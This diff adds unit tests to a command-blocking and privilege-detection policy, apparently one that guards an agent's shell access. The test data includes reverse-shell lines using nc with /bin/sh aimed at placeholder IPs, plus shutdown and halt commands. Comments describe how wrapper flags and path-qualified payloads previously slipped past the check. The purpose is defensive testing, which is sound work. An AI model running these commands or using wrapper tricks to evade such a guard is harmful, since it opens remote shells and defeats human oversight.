@@ -514,3 +514,41 @@ describe('a dashed name is a tool or a script, and the extension says which', ()
     expect(matchElevatedCommand('iptables-restore < f')).toBe('iptables');
   });
 });
+
+describe('a wrapper’s flags belong to the wrapper', () => {
+  it.each([
+    'strace -f nc -e /bin/sh 1.2.3.4 4444',
+    'env -i shutdown -h now',
+    'nohup -x halt',
+    'proxychains -q nc host 1',
+    'sudo -n nc -e /bin/sh 1.2',
+  ])('refuses %s', (command) => {
+    // The rule that a token after a bare flag is that flag's VALUE holds for an
+    // ordinary command, not for a wrapper: a wrapper's flags are its own and
+    // the command follows them. Applying it everywhere skipped the very token
+    // carrying the command — the bypass class the token match exists to close.
+    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
+  });
+
+  it('while an ordinary command’s flag still takes its value', () => {
+    expect(commandPolicyViolation('npm test -- --grep shutdown')).toBeNull();
+    expect(commandPolicyViolation('jest --testNamePattern halt')).toBeNull();
+  });
+});
+
+describe('a wrapper’s positional path is not the payload', () => {
+  it.each([
+    ['timeout 5 /usr/bin/sudo npm i', 'sudo'],
+    ['nohup /bin/su root', 'su'],
+  ])('%s stays elevated', (command, expected) => {
+    // Skipping path-shaped arguments after a wrapper — added for
+    // `flock /tmp/lock cmd` — swallowed a path-qualified payload and dropped
+    // the invocation to the ASK-level permission. Peeling stops at a token that
+    // names a command.
+    expect(matchElevatedCommand(command)).toBe(expected);
+  });
+
+  it('and flock’s actual lock file is still stepped over', () => {
+    expect(matchElevatedCommand('flock /tmp/l sudo apt-get install -y x')).toBe('sudo');
+  });
+});
